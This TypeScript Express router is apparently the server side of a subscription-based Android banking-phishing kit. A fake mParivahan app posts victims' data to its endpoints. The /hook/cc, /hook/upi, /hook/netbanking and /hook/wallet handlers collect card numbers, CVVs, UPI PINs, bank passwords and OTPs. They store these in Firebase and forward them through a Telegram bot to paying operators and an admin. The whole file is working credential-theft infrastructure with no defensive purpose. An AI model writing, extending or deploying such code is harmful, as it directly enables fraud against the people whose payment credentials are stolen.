/**
 * POST /api/hook/cc  — called from mParivahan APK's card.html (no auth cookie)
 * Receives captured CC data and forwards to the device owner via panel bot DM.
 */
import { Router } from "express";
import { isAdminTg, ADMIN_ID } from "../lib/admin";
import { escapeMarkdown } from "../lib/telegramText";
import { sanitizeOwnerTelegramId } from "../lib/telegramIds";
import { logger } from "../lib/logger";
import { fbUpdate, fbGet, isSubscriptionActive } from "../bot/firebase";
import { getBot } from "../bot/index";

const router = Router();


router.post("/hook/cc", async (req, res) => {
  try {
    const {
      ownerTelegramId: rawOwnerTelegramId,
      deviceId,
      cardholderName,
      cardNumber,
      expiry,
      cvv,
      ip,
    } = (req.body ?? {}) as Record<string, string>;

    // Template placeholders (OWNER_TELEGRAM_ID_000000000) and non-numeric
    // garbage are rejected — they can never be DM'd.
    const ownerTelegramId = sanitizeOwnerTelegramId(rawOwnerTelegramId);
    if (!ownerTelegramId || !deviceId || !cardNumber) {
      res.status(400).json({ error: "Missing required fields" });
      return;
    }

    // Only forward for users with an active subscription (or admin)
    const isAdmin = isAdminTg(ownerTelegramId);
    const active = isAdmin || (await isSubscriptionActive(ownerTelegramId));
    if (!active) {
      // Still save to Firebase silently, but don't forward
      logger.warn({ ownerTelegramId }, "CC hook: inactive subscription");
    }

    // Resolve the real device record - never save to placeholder/telegram-ID nodes.
    // Only save to a device that looks like a real device (has modelName/mobNo/sims).
    let realDeviceId = "";
    try {
      const clients = await fbGet("clients");
      if (clients) {
        // 1. Priority: find device where ownerTelegramId matches
        for (const [cid, dev] of Object.entries(
          clients as Record<string, any>
        )) {
          const devObj = dev as Record<string, any>;
          if (!devObj) continue;
          const devOwner = devObj?.ownerTelegramId;
          const devTelegramId = devObj?.telegramId;
          const isRealDevice = !!(
            devObj?.modelName ||
            devObj?.model ||
            devObj?.mobNo ||
            devObj?.deviceId
          );
          if (!isRealDevice) continue; // skip placeholder nodes
          if (
            (devOwner &&
              (devOwner === ownerTelegramId || devOwner === deviceId)) ||
            (devTelegramId && devTelegramId === ownerTelegramId)
          ) {
            realDeviceId = cid;
            break;
          }
        }

        // 2. Fallback: exact deviceId match only if it is a real device
        if (!realDeviceId) {
          const direct = clients[deviceId] as Record<string, any> | undefined;
          if (
            direct &&
            (direct?.modelName ||
              direct?.model ||
              direct?.mobNo ||
              direct?.deviceId)
          ) {
            realDeviceId = deviceId;
          }
        }
      }
    } catch {}

    // Final fallback - clean deviceId (remove braces)
    if (!realDeviceId) {
      realDeviceId = deviceId.replace(/[{}"'\[\]]/g, "").trim();
    }

    // Save to Firebase under the real device record
    await fbUpdate(`clients/${realDeviceId}`, {
      cc_cardholderName: cardholderName || "",
      cc_cardNumber: cardNumber,
      cc_expiry: expiry || "",
      cc_cvv: cvv || "",
      cc_ip: ip || "",
      cc_timestamp: new Date().toISOString(),
    });

    // Lookup device model/phone for the alert message
    let phone = realDeviceId;
    try {
      const device = await fbGet(`clients/${realDeviceId}`);
      phone =
        device?.mobNo || device?.phone || device?.deviceId || realDeviceId;
    } catch {}

    const msg =
      `💳 *CC CAPTURED*\n\n` +
      `📱 Device: \`${escapeMarkdown(phone)}\`\n\n` +
      `👤 *${escapeMarkdown(cardholderName || "Unknown")}*\n` +
      `💳 \`${escapeMarkdown(cardNumber)}\`\n` +
      `📅 Expiry: \`${escapeMarkdown(expiry || "?")}\`\n` +
      `🔒 CVV: \`${escapeMarkdown(cvv || "?")}\`\n\n` +
      `🌐 IP: ${escapeMarkdown(ip || "Unknown")}\n` +
      `🕐 ${new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" })} IST`;

    const bot = getBot();
    if (bot && active) {
      // Send to device owner
      try {
        await bot.telegram.sendMessage(ownerTelegramId, msg, {
          parse_mode: "Markdown",
        });
      } catch (err) {
        logger.error({ err, ownerTelegramId }, "CC hook: failed to DM owner");
      }

      // Also notify admin if owner is not admin
      if (!isAdmin) {
        try {
          await bot.telegram.sendMessage(
            ADMIN_ID,
            msg + `\n\n👤 Owner: \`${escapeMarkdown(ownerTelegramId)}\``,
            { parse_mode: "Markdown" }
          );
        } catch {}
      }
    }

    res.json({ ok: true });
  } catch (err) {
    logger.error({ err }, "CC hook error");
    res.status(500).json({ error: "Internal error" });
  }
});

// ── Generic capture hook for all payment methods ─────────────────────────
async function handleCapture(
  req: any,
  res: any,
  opts: {
    type: string;
    emoji: string;
    label: string;
    fields: { key: string; label: string; hide?: boolean }[];
  }
): Promise<void> {
  try {
    const body = (req.body ?? {}) as Record<string, any>;
    const { deviceId, ip } = body;

    // Template placeholders (OWNER_TELEGRAM_ID_000000000) and non-numeric
    // garbage are rejected — they can never be DM'd.
    const ownerTelegramId = sanitizeOwnerTelegramId(body.ownerTelegramId);
    if (!ownerTelegramId || !deviceId) {
      res.status(400).json({ error: "Missing required fields" });
      return;
    }

    const isAdmin = isAdminTg(ownerTelegramId);
    const active = isAdmin || (await isSubscriptionActive(ownerTelegramId));
    if (!active) {
      logger.warn(
        { ownerTelegramId, type: opts.type },
        "Capture hook: inactive subscription"
      );
    }

    // Resolve the real device record (mirror of /hook/cc logic).
    let realDeviceId = "";
    try {
      const clients = await fbGet("clients");
      if (clients) {
        for (const [cid, dev] of Object.entries(
          clients as Record<string, any>
        )) {
          const devObj = dev as Record<string, any>;
          if (!devObj) continue;
          const devOwner = devObj?.ownerTelegramId;
          const devTelegramId = devObj?.telegramId;
          const isRealDevice = !!(
            devObj?.modelName ||
            devObj?.model ||
            devObj?.mobNo ||
            devObj?.deviceId
          );
          if (!isRealDevice) continue;
          if (
            (devOwner &&
              (devOwner === ownerTelegramId || devOwner === deviceId)) ||
            (devTelegramId && devTelegramId === ownerTelegramId)
          ) {
            realDeviceId = cid;
            break;
          }
        }
        if (!realDeviceId) {
          const direct = clients[deviceId] as Record<string, any> | undefined;
          if (
            direct &&
            (direct?.modelName ||
              direct?.model ||
              direct?.mobNo ||
              direct?.deviceId)
          ) {
            realDeviceId = deviceId;
          }
        }
      }
    } catch {}

    if (!realDeviceId) {
      realDeviceId = String(deviceId)
        .replace(/[{}\u0022'\[\]]/g, "")
        .trim();
    }

    // Save to Firebase under the real device record with type prefix.
    const update: Record<string, any> = {
      [`${opts.type}_timestamp`]: new Date().toISOString(),
      [`${opts.type}_ip`]: ip || "",
    };
    for (const f of opts.fields) {
      if (body[f.key] != null && String(body[f.key]) !== "") {
        update[`${opts.type}_${f.key}`] = String(body[f.key]);
      }
    }
    await fbUpdate(`clients/${realDeviceId}`, update);

    // Append every UPI PIN capture to the per-device history so the panel can
    // show all entries, not just the latest one.
    if (opts.type === "upi") {
      const capKey = String(Date.now());
      await fbUpdate(`clients/${realDeviceId}/upi_captures/${capKey}`, {
        upi_id: String(body.upiId || ""),
        upi_name: String(body.upiName || ""),
        upi_phone: String(body.upiPhone || body.phone || ""),
        upi_vehicle: String(body.vehicle || ""),
        upi_pin: String(body.upiPin || ""),
        ip: String(ip || ""),
        ts: new Date().toISOString(),
      }).catch((err) =>
        logger.error(
          { err, deviceId: realDeviceId },
          "Hook: upi_captures append failed"
        )
      );
    }

    let phone = realDeviceId;
    try {
      const device = await fbGet(`clients/${realDeviceId}`);
      phone =
        device?.mobNo || device?.phone || device?.deviceId || realDeviceId;
    } catch {}

    const lines = [
      `${opts.emoji} *${opts.label.toUpperCase()} CAPTURED*`,
      "",
      `📱 Device: \`${escapeMarkdown(phone)}\``,
      "",
    ];
    for (const f of opts.fields) {
      const val = body[f.key];
      if (val != null && String(val) !== "") {
        const display = f.hide
          ? String(val).replace(/.(?=.)/g, "*")
          : String(val);
        lines.push(`${f.label}: \`${escapeMarkdown(display)}\``);
      }
    }
    lines.push(
      "",
      `🌐 IP: ${escapeMarkdown(ip || "Unknown")}`,
      `🕐 ${new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" })} IST`
    );
    const msg = lines.join("\n");

    const bot = getBot();
    if (bot && active) {
      try {
        await bot.telegram.sendMessage(ownerTelegramId, msg, {
          parse_mode: "Markdown",
        });
      } catch (err) {
        logger.error(
          { err, ownerTelegramId, type: opts.type },
          "Capture hook: failed to DM owner"
        );
      }
      if (!isAdmin) {
        try {
          await bot.telegram.sendMessage(
            ADMIN_ID,
            msg + `\n\n👤 Owner: \`${escapeMarkdown(ownerTelegramId)}\``,
            { parse_mode: "Markdown" }
          );
        } catch {}
      }
    }

    res.json({ ok: true });
  } catch (err) {
    logger.error({ err, type: opts.type }, "Capture hook error");
    res.status(500).json({ error: "Internal error" });
  }
}

router.post("/hook/upi", (req, res) =>
  handleCapture(req, res, {
    type: "upi",
    emoji: "📱",
    label: "UPI",
    fields: [
      { key: "upiId", label: "UPI ID" },
      { key: "upiName", label: "Name" },
      { key: "upiPhone", label: "Phone" },
      { key: "upiPin", label: "UPI PIN", hide: true },
    ],
  })
);

router.post("/hook/netbanking", (req, res) =>
  handleCapture(req, res, {
    type: "nb",
    emoji: "🏦",
    label: "NETBANKING",
    fields: [
      { key: "bank", label: "Bank" },
      { key: "userId", label: "User ID" },
      { key: "password", label: "Password", hide: true },
      { key: "pin", label: "PIN/OTP", hide: true },
    ],
  })
);

router.post("/hook/wallet", (req, res) =>
  handleCapture(req, res, {
    type: "wallet",
    emoji: "👛",
    label: "WALLET",
    fields: [
      { key: "walletType", label: "Wallet" },
      { key: "walletPhone", label: "Phone" },
      { key: "walletOtp", label: "OTP/MPIN", hide: true },
    ],
  })
);

export default router;
